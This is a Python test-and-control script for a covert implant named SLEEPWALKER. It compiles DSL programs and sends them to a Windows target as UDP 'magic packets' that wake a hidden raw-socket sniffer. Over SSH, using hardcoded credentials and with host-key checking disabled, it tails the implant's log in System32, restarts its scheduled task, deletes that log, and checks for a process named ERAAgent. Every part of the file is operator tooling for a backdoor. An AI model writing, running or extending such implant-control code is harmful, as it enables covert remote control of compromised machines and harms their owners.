"""Function-test driver for the SLEEPWALKER implant.

Sends compiled DSL programs to the target implant as UDP-encapsulated magic
packets (the six-gate trigger block sits at the end of the captured buffer,
so the raw-socket sniffer accepts it without requiring a raw socket on the
operator side). Verifies execution by tailing the implant's SW_DEBUG log.

Usage (from tools/):
  python3 function_test/send.py send <dsl> [--port N]
  python3 function_test/send.py tail [--lines N] [--grep PATTERN]
"""

from __future__ import annotations

import argparse
import socket
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from swctl import framing  # noqa: E402

HOST = "192.168.1.100"
USER = "operator"
PASS = "ChangeMe123!"
LOG = r"C:\Windows\System32\sw_debug.log"


def _ssh(cmd: str) -> str:
    r = subprocess.run(
        ["sshpass", "-p", PASS, "ssh", "-o", "StrictHostKeyChecking=no",
         f"{USER}@{HOST}", cmd],
        capture_output=True, text=True, encoding="utf-8", errors="replace",
        timeout=60,
    )
    out = r.stdout
    keep = []
    for ln in out.splitlines():
        if ln.startswith(("WARNING", "**", "Host key", "|", "+--",
                          "CONNECTED", "The authenticity")):
            continue
        keep.append(ln)
    return "\n".join(keep).strip()


def send_magic_udp(dsl_text: str, port: int = 9999) -> bytes:
    from swctl.bytecode import compile_program
    prog = compile_program(dsl_text)
    pkt = framing.build_magic_packet(prog)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.sendto(pkt, (HOST, port))
    return prog


def _log_len() -> int:
    out = _ssh(f"powershell -NoProfile -Command "
               f"(Get-Item {LOG}).Length")
    try:
        return int(out)
    except ValueError:
        return 0


def tail(lines: int = 40, grep: str = "") -> str:
    cmd = f"powershell -NoProfile -Command \"Get-Content {LOG} -Tail {lines}\""
    out = _ssh(cmd)
    if grep:
        out = "\n".join(l for l in out.splitlines() if grep in l)
    return out


def restart(wait: float = 3.0) -> str:
    """Stop+start the 'sleepwalker' scheduled task, resetting the log."""
    _ssh("schtasks /End /TN sleepwalker 2>nul")
    time.sleep(1)
    _ssh(f'del /f /q "{LOG}" 2>nul')
    _ssh("schtasks /Run /TN sleepwalker")
    time.sleep(wait)
    out = _ssh("powershell -NoProfile -Command "
               "(Get-Process ERAAgent -ErrorAction SilentlyContinue).Id")
    return out or "NOT RUNNING"


def main(argv: list | None = None) -> int:
    p = argparse.ArgumentParser()
    sub = p.add_subparsers(dest="cmd", required=True)
    s = sub.add_parser("send")
    s.add_argument("dsl")
    s.add_argument("--port", type=int, default=9999)
    s.add_argument("--no-restart", action="store_true",
                   help="do not restart the implant first")
    r = sub.add_parser("restart")
    r.add_argument("--wait", type=float, default=3.0)
    t = sub.add_parser("tail")
    t.add_argument("--lines", type=int, default=40)
    t.add_argument("--grep", default="")
    a = p.parse_args(argv)

    if a.cmd == "send":
        text = Path(a.dsl).read_text()
        base = _log_len()
        if not a.no_restart:
            pid = restart()
            print(f"implant restarted, PID={pid}")
            time.sleep(1)
        prog = send_magic_udp(text, a.port)
        print(f"sent magic-over-UDP: {len(prog)} byte program -> {HOST}:{a.port}")
        time.sleep(2)
        new = tail(200, grep="vm: opcode")
        print("--- vm opcode lines in log ---")
        print(new)
        return 0
    if a.cmd == "restart":
        print("PID=" + restart(a.wait))
        return 0
    if a.cmd == "tail":
        print(tail(a.lines, a.grep))
        return 0
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
